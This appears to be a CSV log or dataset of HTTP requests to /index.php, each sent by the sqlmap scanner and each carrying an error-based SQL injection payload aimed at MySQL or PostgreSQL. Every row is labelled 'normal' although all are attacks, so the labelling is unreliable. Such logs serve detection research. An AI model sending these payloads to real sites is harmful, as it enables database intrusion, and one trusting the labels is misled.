/,,*/* close,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs' and (select 1540 from(select count(*),concat(0x716b716a71,(select (elt(1540=1540,1))),0x7171717671,floor(rand(0)*2))x from information_schema.plugins group by x)a) and 'bhtk'='bhtk",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs%' and (select 1540 from(select count(*),concat(0x716b716a71,(select (elt(1540=1540,1))),0x7171717671,floor(rand(0)*2))x from information_schema.plugins group by x)a) and '%'='",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs) and (select 1540 from(select count(*),concat(0x716b716a71,(select (elt(1540=1540,1))),0x7171717671,floor(rand(0)*2))x from information_schema.plugins group by x)a) and (9728=9728",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs and (select 1540 from(select count(*),concat(0x716b716a71,(select (elt(1540=1540,1))),0x7171717671,floor(rand(0)*2))x from information_schema.plugins group by x)a)",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs and (select 1540 from(select count(*),concat(0x716b716a71,(select (elt(1540=1540,1))),0x7171717671,floor(rand(0)*2))x from information_schema.plugins group by x)a)-- ygtb",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs') and 5388=cast((chr(113)||chr(107)||chr(113)||chr(106)||chr(113))||(select (case when (5388=5388) then 1 else 0 end))::text||(chr(113)||chr(113)||chr(113)||chr(118)||chr(113)) as numeric) and ('gglm'='gglm,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs' and 5388=cast((chr(113)||chr(107)||chr(113)||chr(106)||chr(113))||(select (case when (5388=5388) then 1 else 0 end))::text||(chr(113)||chr(113)||chr(113)||chr(118)||chr(113)) as numeric) and 'uyvh'='uyvh,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs%' and 5388=cast((chr(113)||chr(107)||chr(113)||chr(106)||chr(113))||(select (case when (5388=5388) then 1 else 0 end))::text||(chr(113)||chr(113)||chr(113)||chr(118)||chr(113)) as numeric) and '%'=',normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs) and 5388=cast((chr(113)||chr(107)||chr(113)||chr(106)||chr(113))||(select (case when (5388=5388) then 1 else 0 end))::text||(chr(113)||chr(113)||chr(113)||chr(118)||chr(113)) as numeric) and (8687=8687,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs and 5388=cast((chr(113)||chr(107)||chr(113)||chr(106)||chr(113))||(select (case when (5388=5388) then 1 else 0 end))::text||(chr(113)||chr(113)||chr(113)||chr(118)||chr(113)) as numeric),normal
